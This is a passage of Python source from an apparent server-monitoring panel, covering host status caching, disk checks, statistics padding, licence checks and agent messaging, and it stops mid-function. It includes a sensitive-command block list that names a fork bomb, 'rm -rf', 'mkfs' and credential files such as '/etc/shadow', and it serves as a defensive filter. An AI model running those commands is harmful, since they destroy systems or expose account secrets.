                cached_data = (int(server_info['last_active_time']), server_info['ip'], int(int(server_info['is_authorized']) and int(server_info['status'])))

        if server_status is not None:
            # 更新主机IP
            if remote_addr is None \
                    or len(remote_addr) == 0 \
                    or remote_addr == cached_data[1] \
                    or not public.check_ip(remote_addr):
                remote_addr = cached_data[1]

            cached_data = (cached_data[0] if int(server_status) == 0 else cur_time, remote_addr, int(server_status))
            public.cache_set(cache_key, cached_data)

        return cached_data

    def get_server_ip(self):
        '''
            @name 获取服务端内网IP与公网IP
            @author Zhj<2022-07-06>
            @return (内网IP列表<list>, 公网IP)
        '''
        internal_ips = []
        published_ip = None

        # 获取内网IP
        res = public.ExecShell('ip addr')

        if len(res) > 0:
            m = re.findall(r'inet ((?:25[0-5]|2[0-4]\d|1(?:[0-1]|[3-9])\d|12(?:[0-6]|[8-9])|\d{1,2})(?:\.\d{1,3}){3})',
                           res[0])

            if m:
                internal_ips += m

        if len(internal_ips) == 0:
            internal_ips.append('127.0.0.1')

        # 获取公网IP
        published_ip = public.GetLocalIp()

        return internal_ips, published_ip

    def server_is_authorized(self, sid):
        '''
            @name 检查主机是否已授权
            @author Zhj<2022-08-24>
            @param sid<integer> 主机ID
            @return bool
        '''
        return self.db_easy('servers') \
            .where('sid=?', sid) \
            .where('status', 1) \
            .field('sid') \
            .exists()

    def server_is_online(self, sid):
        '''
            @name 检查主机是否在线
            @author Zhj<2022-07-09>
            @param  sid<integer> 主机ID
            @return bool
        '''
        # 更新主机状态
        # self.update_servers(sid)

        # 检查主机是否维护中
        # if self.server_is_maintenance(sid):
        #    return True

        # 检查主机是否在线
        return True if public.cache_get('SERVER_CONNECTION_' + str(sid)) else False

    def server_is_maintenance(self, sid):
        '''
            @name 检查主机是否维护(关闭告警通知)
            @author Zhj<2022-07-09>
            @param  sid<integer> 主机ID
            @return bool
        '''
        return not self.db_easy('servers').where('`sid` = ? AND `allow_notify` = 0', int(sid)).exists()

    def running_dir_used_percent_high(self):
        '''
            @name 检查 /www 挂载点磁盘使用率 是否超过97%
            @author Zhj<2022-07-09>
            @return bool
        '''
        # 挂载点
        mount_point = public.get_panel_path()

        # 阈值
        threshold = 98

        # 缓存键
        cache_key = 'BT_MONITOR_CACHE_RUNNING_DIR_USED_PERCENT'
        cached_percent = public.cache_get(cache_key)

        if cached_percent is not None:
            used_percent, inodes_used_percent = cached_percent.split('|', 1)

            return float(used_percent) > threshold or float(inodes_used_percent) > threshold

        # 预编译正则表达式对象
        re_obj = re.compile(r'((?:100(?:\.0{1,2})?|(?:[1-9]\d|\d)(?:\.\d{1,2})?))\%')

        # 获取磁盘占用率
        res = public.ExecShell('df {}'.format(mount_point))

        if len(res) < 1:
            return True

        m = re_obj.search(res[0])

        if m is None:
            return True

        used_percent = float(m.group(1))

        # 获取inode占用率
        res = public.ExecShell('df -i {}'.format(mount_point))

        if len(res) < 1:
            return True

        m = re_obj.search(res[0])

        if m is None:
            return True

        inodes_used_percent = float(m.group(1))

        public.cache_set(cache_key, '{}|{}'.format(str(used_percent), str(inodes_used_percent)), 120)

        return used_percent > threshold or inodes_used_percent > threshold

    def statistics_helper(self,
                          args,
                          table_name,
                          fields,
                          where=None,
                          binds=(),
                          order_field='create_time',
                          pad_el=None,
                          pad_step=1800,
                          sid=None):
        '''
            @name 图表数据统计帮助方法
            @author Zhj<2022-07-22>
            @param  args<dict>              请求参数列表
            @param  table_name<string>      表名
            @param  fields<tuple|list>      字段列表
            @param  where<?string>          where条件[可选]
            @param  binds<tuple|list>       绑定参数[可选]
            @param  order_field<?string>    排序字段[可选 默认'create_time']
            @param  pad_el<?dict>           填充数据模板[可选]
            @param  pad_step<?integer>      数据填充时间间隔/秒[可选 默认1200秒]
            @param  sid<?integer>           服务器ID[可选 指定时从分库查询]
            @return list
        '''
        # 参数列表必须是列表或者元组
        if not isinstance(fields, list) and not isinstance(fields, tuple):
            raise Exception('fields must a type of list or tuple')

        # 获取时间区间
        query_date = args.get('query_date', 'today')
        query_start, query_end = public.get_query_timestamp(query_date)

        # 默认填充数据模板
        if pad_el is None:
            pad_el = {}
            for field in fields:
                field = field.strip()
                pad_el[field] = 0

        # 从主库查询
        if sid is None:
            # 构建查询构造器
            query = self.db_easy(table_name) \
                .where('`{}` BETWEEN ? AND ?'.format(order_field), [query_start, query_end]) \
                .field(*fields) \
                .order(order_field, 'ASC')

            # 添加where条件
            if where is not None:
                query.where(where, binds)

            # 查询数据
            res = query.select()

        # 从分库查询
        else:
            # 查询构造器处理函数
            def query_handler(query):
                query.field(*fields)

                # 添加where条件
                if where is not None:
                    query.where(where, binds)

            # 查询数据
            res = monitor_db_manager.MonitorDbManager(sid).query(table_name, query_handler, query_start, query_end,
                                                                 order_field)

        if res is None:
            return []

        # 填充空缺数据并返回
        return self.pad_statistics_result(res, query_start, query_end, pad_step, pad_el, pad_last=False)

    def server_statistics_helper(self, args, table_name, fields, where=None, binds=()):
        '''
            @name 主机统计帮助方法
            @author Zhj<2022-07-12>
            @param  args<dict>          请求参数列表
            @param  table_name<string>  表名
            @param  fields<string>      字段列表
            @param  where<string>       where条件[可选]
            @param  binds<list|tuple>   绑定参数[可选]
            @param  pad_el<?dict>       填充数据模板[可选]
            @return list
            @throws public.PanelError
        '''
        sid = args.get('sid', None)

        if sid is None:
            raise public.PanelError('缺少参数：sid')
        server_list = g.get("server_list", [])
        if int(sid) not in server_list:
            public.response(False, '您没有权限访问该服务器!')

        # 添加主机ID查询条件
        if where is not None:
            where += ' AND `sid` = ?'
        else:
            where = '`sid` = ?'

        binds += (int(sid),)

        return self.statistics_helper(
            args,
            table_name,
            list(map(lambda x: x.strip(), fields.split(','))),
            where,
            binds,
            sid=sid
        )

    def process_statistics_helper(self, args, table_name, fields, where=None, binds=(), pad_el=None):
        '''
            @name 进程统计帮助方法
            @author Zhj<2022-08-20>
            @param  args<dict>          请求参数列表
            @param  table_name<string>  表名
            @param  fields<string>      字段列表
            @param  where<string>       where条件[可选]
            @param  binds<list|tuple>   绑定参数[可选]
            @return list
            @throws public.PanelError
        '''
        pid = args.get('pid', None)

        if pid is None:
            return public.error('缺少参数：pid')

        sid = args.get('sid', None)

        if sid is None:
            # 获取服务器ID
            sid = self.db_memory('processes') \
                .where('id=?', pid) \
                .value('sid')

        if sid is None:
            return public.error('无效的参数：pid')

        return self.statistics_helper(
            args,
            table_name,
            fields,
            where,
            binds,
            sid=sid,
            pad_el=pad_el
        )

    def pad_statistics_result(self, result, start_time, end_time, step, pad_el, field='create_time', pad_last=True):
        '''
            @name 填充统计数据
            @author Zhj<2022-07-21>
            @param  result<list>        统计数据(升序排列)
            @param  start_time<integer> 起始时间 时间戳
            @param  end_time<integer>   结束时间 时间戳
            @param  step<integer>       时间间隔/秒
            @param  pad_el<dict>        填充的数据模板
            @param  field<?string>      字段名[可选 默认'create_time']
            @param  pad_last<?bool>     当最后一个区间为空时，是否进行填充[可选 默认填充]
            @return list
        '''
        # 让结束时间在有效范围内
        cur_time = int(time.time())
        end_time = cur_time if end_time > cur_time else end_time

        if start_time >= end_time:
            return result

        m = {}
        step = int(step)
        half_step = int(step / 2)
        # ninety_nine_percent_step = int(step * 0.99)

        for row in result:
            k = int(row[field] / step)

            if k not in m:
                m[k] = []

            m[k].append(row)

        new_result = []

        def pad_el_helper(t):
            el = {}
            el.update(pad_el)
            el[field] = t
            new_result.append(el)

        k = 0

        while start_time < end_time:
            k = int(start_time / step)

            if k in m:
                if m[k][0][field] > start_time + half_step:
                    pad_el_helper(start_time)
                new_result += m[k]
            else:
                pad_el_helper(start_time)
                # pad_el_helper(start_time + ninety_nine_percent_step)

            start_time += step

        # 设置了不填充末尾元素时，pop掉填充到末尾的元素
        if not pad_last and len(new_result) > 0 and k not in m:
            new_result.pop()

        k = int(start_time / step)

        if k in m:
            if m[k][0][field] > start_time + half_step:
                pad_el_helper(start_time)
            new_result += m[k]

        return new_result

    def check_monitor_endtime(self):
        '''
            @name 检查云监控是否在有效期内
            @author Zhj<2022-07-25>
            @return bool
        '''
        # 默认到期时间 2022-11-31 23:59:59
        end_time = 1669823999
        cur_time = int(time.time())

        # 获取授权信息
        # ret = AuthModule().check_auth_status(public.to_dict_obj({}))
        #
        # if not isinstance(ret, dict)\
        #     or 'status' not in ret\
        #     or not ret['status']\
        #     or 'data' not in ret\
        #     or not isinstance(ret['data'], dict)\
        #     or int(ret['data'].get('status', 0)) != 1:
        #     return False
        #
        # end_time = int(ret['data'].get('end_time', -1))
        #
        # if end_time < 0:
        #     return False
        #
        # if end_time == 0:
        #     return True

        return cur_time < end_time

    def get_available_clients(self):
        '''
            @name 获取有效的客户端数量
            @author Zhj<2022-10-25>
            @return integer
        '''
        # 获取当前时间
        cur_time = int(time.time())

        # 默认授权台数
        default_num = 5

        # 获取授权信息
        auth_info = self.get_auth_info()

        # 检查授权信息
        if not auth_info:
            return default_num

        end_time = int(auth_info.get('end_time', -1))

        # 无效授权
        if end_time < 0:
            return default_num

        # 授权已过期
        if end_time > 0 and cur_time >= end_time:
            return default_num

        return int(auth_info.get('clients', 0))

    # 获取授权信息
    def get_auth_info(self, force=False):
        '''
            @name 获取授权信息
            @author Zhj<2022-11-08>
            @param force<?bool> 强制同步云端授权数据
            @return dict|None
        '''
        # 获取授权信息
        ret = AuthModule().check_auth_status(public.to_dict_obj({
            'force': int(force),
        }))

        # 检查授权信息
        if not isinstance(ret, dict) \
                or 'status' not in ret \
                or not ret['status'] \
                or 'data' not in ret \
                or not isinstance(ret['data'], dict):
            return None

        ret = ret['data']

        return {
            'product': 'cloud_monitor',
            'status': 1,
            'clients': ret.get('total_auth_num', 5),
            'end_time': ret.get('min_end_time', int(time.time()) - 1),
            'type': ret.get('type', 0),
            'cur_auth_num': ret.get('cur_auth_num', 0),  # 当前购买的已授权数量
        }

    # 记录模块使用次数帮助函数
    def __set_module_logs(self, mod_name, fun_name, count=1):
        """
            @模块使用次数
            @mod_name 模块名称
            @fun_name 函数名
        """
        import datetime
        data = {}
        path = '{}/data/mod_log.json'.format(public.get_panel_path())
        if os.path.exists(path):
            try:
                data = json.loads(public.readFile(path))
            except:
                pass

        fun_name = f'{mod_name}/{fun_name}'
        mod_name = 'cloud_monitor'

        key = datetime.datetime.now().strftime("%Y-%m-%d")
        if not key in data: data[key] = {}

        if not mod_name in data[key]:
            data[key][mod_name] = {}

        if not fun_name in data[key][mod_name]:
            data[key][mod_name][fun_name] = 0

        data[key][mod_name][fun_name] += count

        public.writeFile(path, json.dumps(data))

        return True

    # 记录模块使用次数
    def set_module_logs(self, mod_name, fun_name, count=1):
        """
            @模块使用次数
            @mod_name 模块名称
            @fun_name 函数名
        """
        from core.include.monitor_helpers import monitor_task_queue
        monitor_task_queue.add_task_easy(self.__set_module_logs, mod_name, fun_name, count)
        return True

    def report_module_logs(self, force=False):
        return
        '''
            @name 提交模块统计信息
            @author Zhj<2023-03-23>
            @param force<?bool> 是否强制提交
            @return bool
        '''
        cache_key = 'SHM_:BT_MONITOR_CACHE__MODULE_LOGS_REPORTED'

        # 检查缓存，每小时提交一次
        if not force and public.cache_get(cache_key):
            return True

        path = '{}/data/mod_log.json'.format(public.get_panel_path())

        if not os.path.exists(path):
            return False

        mdata = {}
        sday = public.format_date()
        try:
            mdata = json.loads(public.readFile(path))
        except:
            pass

        nData = {}
        pdata = self.get_user_info()

        # 未绑定官网账号
        if pdata is None:
            return False

        is_success = True

        for key in mdata:
            if sday.find(key) >= 0:
                nData[key] = mdata[key]
                continue
            pdata['day_date'] = key
            pdata['data_list'] = json.dumps(mdata[key])
            try:
                ret = json.loads(public.httpPost('http://www.example.com/api/v2/statistics/report_plugin_daily', pdata))
                if not ret['success']:
                    nData[key] = mdata[key]
                    is_success = False
            except:
                nData[key] = mdata[key]
                is_success = False

        public.writeFile(path, json.dumps(nData))

        # 提交成功，写入缓存
        if is_success:
            public.cache_set(cache_key, 1, 3599)

        return is_success

    def report_daily_active(self, force=False):
        return
        '''
            @name 提交日活统计
            @author Zhj<2023-03-08>
            @param  force<?bool> 是否强制提交
            @return bool
        '''
        cache_key = 'SHM_:BT_MONITOR_CACHE__DAILY_ACTIVE_REPORTED'

        # 检查缓存，每小时提交一次
        if not force and public.cache_get(cache_key):
            return True

        pdata = self.get_user_info()
        #
        # public.print_log(
        #     '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> {}'.format(pdata),
        #     _level='error')

        # 未绑定官网账号
        if pdata is None:
            return

        from core.include.monitor_helpers import warning_obj

        with public.sqlite_easy('safety') as db:
            pdata['last_login_time'] = db.query() \
                .name('users') \
                .order('last_login_time', 'desc') \
                .value('last_login_time')

        servers = []

        # 获取已授权的主机列表
        with public.sqlite_easy('monitor_mgr') as db:
            servers = db.query() \
                .name('servers') \
                .where('is_authorized', 1) \
                .field('sid', 'ip', 'type', 'allow_notify', 'create_time') \
                .select()

        # 尝试获取面板版本
        for server in servers:
            panel_version_file = '{}/data/monitor_servers/{}/panel_version.pl'.format(public.get_panel_path(), public.md5(str(server['sid'])))

            server['is_setup_panel'] = 0
            server['panel_version'] = ''

            if not os.path.exists(panel_version_file):
                continue

            with open(panel_version_file, 'r') as fp:
                panel_version = fp.read()

                if len(panel_version) > 0:
                    server['is_setup_panel'] = 1
                    server['panel_version'] = panel_version

        # public.print_log(
            # '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> 11',
            # _level='error')

        # 计算公开页面主机数
        published_page_conf_content = public.readFile('{}/config/public_server_list.json'.format(public.get_panel_path()))
        published_page_server_count = 0
        if published_page_conf_content:
            try:
                published_page_server_count = len(json.loads(published_page_conf_content)['sid_list'])
            except: pass

        # 统计当日告警关联主机数
        # self.set_module_logs('')

        # public.print_log(
        #     '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> 22',
        #     _level='error')

        # 额外信息
        extra = {
            # 统计业务监控
            'availability_http': self.db_easy('availability_http').count(),  # 统计HTTP监控数
            'availability_port': self.db_easy('availability_port').count(),  # 统计端口监控数
            'availability_ping': self.db_easy('availability_ping').count(),  # 统计PING监控数
            'fortress': self.db_easy('ssh_info', 'monitor_mgr').count(),  # 添加的堡垒机数量
            'fortress_from_server_list': self.db_easy('ssh_info', 'monitor_mgr').where('sid > 0').count(),  # 添加的堡垒机数量(主机终端)
            'fortress_from_self': self.db_easy('ssh_info', 'monitor_mgr').where('sid = 0').count(),  # 添加的堡垒机数量(堡垒机界面)
            'fortress_commands': self.db_easy('fortress_command').count(),  # 添加的堡垒机常用命令
            'process_monitoring': self.db_easy('custom_process').count(),  # 进程监控任务数
            'script_monitoring': self.db_easy('custom_script').count(),  # 脚本监控任务数
            'malicious_tasks': self.db_easy('malicious_scan_tasks', 'malicious_scan').count(),  # 病毒扫描任务数
            'warning_templates': self.db_easy('warning_template_packages', 'monitor_mgr').count(),  # 添加的告警模板数量
            'warning_template_rules': self.db_easy('warning_templates', 'monitor_mgr').count(),  # 添加的告警模板规则数量
            'warning_rules': self.db_easy('warning_configurations', 'monitor_mgr').count(),  # 已配置的告警规则数量
            'published_page': published_page_server_count,  # 公开页面主机数
            'push_methods': warning_obj.get_push_methods(),  # 已设置的告警推送方式
            # 有效告警数量  1.有关联主机 2.开启推送 3.配置告警推送方式
            'warning_push_rules': self.db_easy('warning_configurations', 'monitor_mgr') \
                .where('is_push = 1 ') \
                .where('push_methods != "" ') \
                .where('template_id  > 0 ') \
                .count(),
        }

        # public.print_log('>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> 33', _level='error')

        pdata['server_cnt'] = len(servers)
        pdata['servers'] = json.dumps(servers, ensure_ascii=False)
        pdata['extra'] = json.dumps(extra, ensure_ascii=False)

        is_success = True

        try:
            ret = json.loads(public.httpPost('http://www.example.com/api/v2/statistics/report_btmonitor_daily', pdata))
            if not ret['success']:
                is_success = False
        except:
            is_success = False

        # 提交成功，写入缓存
        if is_success:
            public.cache_set(cache_key, 1, 3599)

        return is_success

    def submit_statistics(self, force=False):
        '''
            @name 提交统计数据
            @author Zhj<2023-03-23>
            @param  force<?bool> 是否强制提交
            @return bool
        '''
        try:
            self.report_module_logs(force)
        except: pass

        try:
            self.report_daily_active(force)
        except: pass

        return True

    def get_user_info(self):
        '''
            @name 获取官网绑定用户信息
            @author Zhj<2022-07-25>
            @return dict|None
        '''
        filename = '{}/data/user.json'.format(public.get_panel_path())
        data = None

        try:
            if os.path.exists(filename):
                data = json.loads(public.readFile(filename))
        except:
            pass

        return data

    def warn_server_status_on_off(self, sid, server_status):
        '''
            @name 主机上下线告警
            @author Zhj<2022-08-25>
            @param  sid<integer>           主机ID
            @param  server_status<integer> 主机状态 0-下线 1-上线
            @return void
        '''
        from core.include.monitor_helpers import warning_obj

        if server_status not in [0, 1]:
            return

        # 状态变更类型 上线 or 下线
        change_type = 'online' if server_status == 1 else 'offline'

        # 获取主机上下线告警规则
        warning_rules = warning_obj.get_warning_rules(sid, 'client', 'status', 'on_off')

        # 开始告警
        # s_time = time.time()
        # public.print_log('--开始主机上下线告警')
        for warning_rule in warning_rules:
            warning_obj.warn(warning_rule, change_type, no_threshold=True)
        # public.print_log('--主机上下线告警完成 耗时：{}s'.format(time.time() - s_time))

    def warn_server_ssh_login_place_other(self, sid, login_status):
        '''
            @name SSH异地登录告警
            @author Zhj<2022-10-11>
            @param  sid<integer>            主机ID
            @param  login_status<string>    SSH登录状态
            @return void
        '''
        from core.include.monitor_helpers import warning_obj

        if login_status not in ['success', 'fail']:
            return

        # 获取主机SSH异地登录提醒规则
        warning_rules = warning_obj.get_warning_rules(sid, 'log', 'ssh_login_logs', 'place_other')

        for warning_rule in warning_rules:
            warning_obj.warn(warning_rule, login_status)

    def get_server_describe(self, sid):
        '''
            @name 获取主机描述信息(IP+备注)
            @author Zhj<2022-08-25>
            @param  sid<integer> 主机ID
            @return string
        '''
        cache_key = 'BT_MONITOR_CACHE_SERVER_DESCRIBE__{}'.format(str(sid))

        # 优先从缓存中读取
        server_describe = public.cache_get(cache_key)

        if server_describe:
            return server_describe

        server_info = self.db_easy('servers') \
            .where('sid=?', sid) \
            .field('ip', 'remark') \
            .find()

        if server_info is None:
            return ''

        server_describe = '{}{}'.format(server_info['ip'],
                                        '（{}）'.format(server_info['remark']) if server_info['remark'] != '' else '')

        # 写入缓存
        public.cache_set(cache_key, server_describe, 120)

        return server_describe

    def search_ip_info(self, ips):
        '''
            @name IP归属地查询
            @author Zhj<2022-10-09>
            @param  ips<string|list> 单个IP或者多个IP
            @return dict
        '''
        if not isinstance(ips, list):
            ips = [ips]

        res = public.httpPost('https://api.bt.cn/bt_monitor/ip_info', {
            'ip': ','.join(ips),
        })

        if not res:
            return {}

        try:
            ret = json.loads(res)
        except:
            return {}

        for (k, v) in ret.items():
            if v['country'] == '保留':
                v['country'] = '局域网'

        return ret

    def store_raidinfo(self, sid, raid_info):
        """接收客户端阵列信息

        Args:
            sid (str): 服务器ID
            raid_info: 最新的磁盘阵列信息
        """
        data = {
            "detail": raid_info["checkDetail"],
            "output": raid_info["checkOutput"],
            "ctrlcount": raid_info["controllerCount"],
            "check_result": raid_info["checkResult"],
            "check_dell": raid_info["checkdell"],
        }
        # public.print_log("存储阵列信息")
        # 写入数据
        # db_mgr = monitor_db_manager.MonitorDbManager(sid)


        with monitor_db_manager.db_mgr('server_raid_info') as db:
            record = db.query() \
                .name('server_raid_info') \
                .where('`sid` = ?', [int(sid)]) \
                .find()


            # public.print_log("record: {}".format(str(record)))
            if not record:
                if len(data['output']) < 200:
                    data['output'] = ''
                else:
                    data['output'] = data['output']
                data["sid"] = sid
                # public.print_log("add raid info.")
                # public.print_log(data)
                db.query().name('server_raid_info').insert(data, get_rowid=False)
            else:
                if data['output'] == record['output'] and len(data['output']) < 200:
                    data['output'] = ''
                else:
                    data['output'] = data['output']
                # public.print_log("update raid info.")
                # public.print_log(data)
                db.query().name('server_raid_info') \
                    .where('`sid` = ?', [int(sid)]).update(data)

    def is_sensitive_command(self, command):
        '''
            @name 检查是否敏感命令
            @param command<string> 命令
            @return bool
        '''
        sensitive_commands = [
            'rm ',
            'rm -rf',
            'rm -f',
            'mkfs',
            'yum install',
            'yum remove',
            'apt install',
            'apt uninstall',
            'who',
            'chown',
            'chmod',
            'chattr',
            'lsattr',
            ':(){:|:&};:',
            '/etc/passwd',
            '/etc/shadow',
            'passwd',
            '/etc/profile',
            'history',
            '/etc/sudoers',
            '/etc/rc.local',
            '/etc/ssh/ssh_config',
            'last',
            'mount',
            'umount',
            '/etc/rc.d/',
            'pam',
            'sudo',
            'su',
        ]

        for sensitive_command in sensitive_commands:
            if str(command).find(sensitive_command) > -1:
                return True

        return False

    def get_pne_id(self, process_name, process_path):
        '''
            @name 获取进程名称与进程启动路径对应的hash值(64位带符号整数)
            @author Zhj<2022-12-30>
            @param process_name<string> 进程名称
            @param process_path<string> 进程启动路径
            @return int
        '''
        pne_id, _ = mmh3.hash64('{}|{}'.format(process_name, process_path))
        return pne_id

    def sampling_global(self, sid, sampling = None):
        '''
            @name 获取或者检查主机全局监控数据采样设置状态
            @author Zhj<2023-01-11>
            @param sid<int>      主机ID
            @param sampling<?int> 全局监控数据采样类型[可选]
            @return:
        '''

        from core import sampling_global

        global_sampling = sampling_global.get(int(sid), 3)

        # cache_key = 'BT_MONITOR_CACHE__SAMPLING_GLOBAL__{}'.format(sid)

        # global_sampling = public.cache_get(cache_key)

        # if global_sampling is None:
        # global_sampling = self.db_easy('servers') \
        #     .where('sid', sid) \
        #     .value('sampling')
        #     # public.cache_set(cache_key, global_sampling, 600)
        #
        # if sampling is None:
        #     return int(global_sampling)

        return (int(global_sampling) & int(sampling)) == int(sampling)

    def sampling_closed(self, sampling_type='global', sid=None, process_id=None):
        '''
            @name 检查指定的监控数据采样是否关闭
            @author Zhj<2022-01-05>
            @param sampling_type<string> 监控数据采集类型
            @param sid<?int>            主机ID
            @param process_id<?int>     进程ID
            @return bool
        '''
        if sid is None and process_id is None:
            return False

        # 监控数据类型映射表
        sampling_types = {
            'global': monitor_enums.SAMPLING_TYPE__GLOBAL,                  # 全局
            'cpu': monitor_enums.SAMPLING_TYPE__CPU,                        # CPU占用率
            'mem': monitor_enums.SAMPLING_TYPE__MEM,                        # CPU占用率
            'swap': monitor_enums.SAMPLING_TYPE__SWAP,                      # SWAP占用(主机)
            'load_avg': monitor_enums.SAMPLING_TYPE__LOAD_AVG,              # 平均负载(主机)
            'disk_io': monitor_enums.SAMPLING_TYPE__DISK_IO,                # 磁盘IO(进程)
            'net_io': monitor_enums.SAMPLING_TYPE__NET_IO,                  # 网络IO
            'disk': monitor_enums.SAMPLING_TYPE__DISK,                      # 磁盘占用(主机)
            'opened_threads': monitor_enums.SAMPLING_TYPE__OPENED_THREADS,  # 打开线程数(进程)
            'opened_files': monitor_enums.SAMPLING_TYPE__OPENED_FILES,      # 打开文件数(进程)
        }

        k = 'server|{}|{}'.format(sid, sampling_types[sampling_type])

        if process_id is not None:
            k = 'process|{}|{}'.format(process_id, sampling_types[sampling_type])

        # cache_key = 'BT_MONITOR_CACHE__SAMPLING_CLOSED__{}'.format(k)
        #
        # res = public.cache_get(cache_key)

        from core import sampling_closed
        res = sampling_closed.get(public.mmh3_hash64(k), 1) == 0
        # if res is None:
        #     res = self.db_easy('sampling_settings')\
        #         .where('id', public.mmh3_hash64(k))\
        #         .where('status', 0)\
        #         .field('id')\
        #         .exists()
        #     public.cache_set(cache_key, res, 600)

        return res

    def calc_sampling_store_total(self, p_type='server', sid=None):
        '''
            @name 计算监控采样数据存储占用
            @author Zhj<2023-01-07>
            @param p_type<string> 分类(server|process)
            @param sid<?int> 主机ID
            @return int
        '''
        cache_key = 'CALC_STORE_TOTAL__{}_{}'.format(p_type, sid if sid is not None else 0)

        # 优先从缓存中获取结果
        cached_res = public.cache_get(cache_key)

        if cached_res:
            return cached_res

        res, _ = public.ExecShell('du -s '+public.get_panel_path()+'/data/monitor_servers/'+(('{}/'.format(public.md5(str(sid))) if sid is not None else '')+'**/{}_*'.format(p_type))+" |awk '{sum+=$1}END{print sum}'")
        res = int(res)

        # 缓存计算结果一小时
        public.cache_set(cache_key, res, 3600)

        return res

    # TODO 清理垃圾数据释放存储空间
    def clear_store_garbage(self):
        pass

    def __clear_invalid_cached_process_data(self):
        '''
            @name 清理无效的进程缓存数据
            @author Zhj<2023-01-12>
            @return None
        '''
        cache_key = 'BT_MONITOR_CACHE__CLEAR_CACHED_PROCESS_DATA'

        # 每隔1分钟清理一次
        if not public.cache_get(cache_key):
            public.cache_set(cache_key, 1, 60)
            # public.print_log('cur cached process data num: {}'.format(len(self.__CACHED_PROCESSES)))

            cur_time = int(time.time())
            with Locker.acquire(self.__UPDATE_CACHED_PROCESSES_LOCK, timeout=5):
                ks = list(self.__CACHED_PROCESSES.keys())
                for k in ks:
                    _, create_time = self.__CACHED_PROCESSES.get(k, (None, 0))
                    if cur_time >= create_time + 120:
                        self.__CACHED_PROCESSES.pop(k, None)

            with Locker.acquire(self.__UPDATE_CACHED_PROCESS_NET_LOCK, timeout=5):
                ks = list(self.__CACHED_PROCESS_NET.keys())
                for k in ks:
                    _, create_time = self.__CACHED_PROCESS_NET.get(k, (None, 0))
                    if cur_time >= create_time + 120:
                        self.__CACHED_PROCESS_NET.pop(k, None)

    # 清理无效数据库连接
    def __clear_invalid_db(self):
        cache_key = 'BT_MONITOR_CACHE__CLEAR_CACHED_DB_CONNECTIONS'

        # 每隔1分钟清理一次
        if not public.cache_get(cache_key):
            public.cache_set(cache_key, 1, 60)
            cur_time = int(time.time())
            with Locker.acquire(self.__DB_DICT_UPDATE_LOCK, timeout=5):
                ks = list(self.__DB_DICT.keys())
                for k in ks:
                    _, create_time = self.__DB_DICT.get(k, (None, 0))
                    if cur_time >= create_time + 120:
                        self.__DB_DICT.pop(k, None)

    def in_demo(self):
        '''
            @name 检测是否是demo
            @author Zhj<2023-04-12>
            @return bool
        '''
        cache_key = 'BT_MONITOR__IN_DEMO'

        in_demo = public.cache_get(cache_key)

        if in_demo is not None:
            return in_demo

        in_demo = os.path.exists('{}/data/.demo'.format(public.get_panel_path()))

        public.cache_set(cache_key, in_demo)

        return in_demo

    # 获取向Agent发送消息缓存名
    def build_send_message_to_agent_cache_name(self, sid, module, action):
        return r'UPDATE_DATA_WITH_AGENT__{}__{}/{}'.format(sid, module, action)

    # 获取主动向Agent获取数据频率/秒
    def get_min_agent_request_interval(self):
        return self.__MIN_AGENT_REQUEST_INTERVAL

    # 主动请求Agent更新信息
    def update_data_with_agent(self, sid, module, action):
        from core.include.monitor_helpers import monitor_task_queue

        # 上锁，防止并发
        with Locker.acquire(self.__AGENT_REQUEST_LOCK, timeout=600):
            # 缓存键名
            cache_key = r'UPDATE_DATA_WITH_AGENT__{}__{}/{}'.format(sid, module, action)

            # 请求过于频繁
            if public.cache_get(cache_key) is not None:
                return

            # 缓存，避免频繁发送请求
            public.cache_set(cache_key, 1, 600)

            # 异步发送请求
            def __inner():
                try:
                    ret, err = self.send_message_to_agent(sid, '{}/{}'.format(module, action))

                    if err is not None:
                        public.print_exc_stack(err)
                        return

                    public.invoke_func('core.include.ws_recv_functions', 'recv_{}'.format(module), [{
                        'remote_addr': None,
                        'sid': sid,
                        'data': {
                            'body': ret
                        },
                    }])
                finally:
                    # 请求结束后，设置下一次调用间隔
                    public.cache_set(cache_key, 1, self.__MIN_AGENT_REQUEST_INTERVAL)

            # 放入队列执行
            monitor_task_queue.add_task_easy(__inner)

    # 向Agent客户端主动发送消息
    def send_message_to_agent(self, sid, target_api, params=None, timeout=120):
        """
            @author Zhj<2023-07-26>
            @param sid<int>         主机SID
            @param target_api<str>  请求API
            @param params<dict>     请求参数
            @param timeout<int>     超时时间/秒
            @return (响应内容<dict|str|None>, 异常对象<exception|None>)
        """
        target_api_parts = str(target_api).split('/')

        if len(target_api_parts) != 2:
            return None, BtMonitorException('参数[target_api]错误：{}'.format(target_api))

        res = public.send_agent_msg(
            public.get_serverid_bysid(sid),
            target_api_parts[0],
            target_api_parts[1],
            timeout=timeout,
            pdata=public.g_pdata(params or {}))

        if not res:
            return None, BtMonitorException('消息发送失败：无法与指定主机完成通信')

            # 判断响应状态：响应结果状态为 处理失败
        if int(res.get('body', {}).get('status', 0)) == 0:
            return (res.get('body', {}).get('body', None),
                    BtMonitorException(res.get('body', {}).get('error_msg', '消息发送失败：Agent响应结果为空 -- 1')))

            # 获取响应结果
        ret_body = res.get('body', {}).get('body', None)

        if ret_body is None:
            return None, BtMonitorException('消息发送失败：Agent响应结果为空 -- 2')

        if str(res.get('body', {}).get('type', 'json')).lower() == 'json' and isinstance(ret_body, str):
            try:
                return json.loads(ret_body), None
            except BaseException as e:
                return ret_body, e

        return ret_body, None

    # 远程主机执行Shell脚本
    def exec_shell_with_agent(self, sid, shell):
        """
            @name 远程主机执行Shell脚本
            @author Zhj<2023-05-08>
            @param sid<int>         主机ID
            @param shell<string>    shell脚本
            @return (res<string|None>, error<BtMonitorException|None>)
        """
        if self.is_sensitive_command(shell):
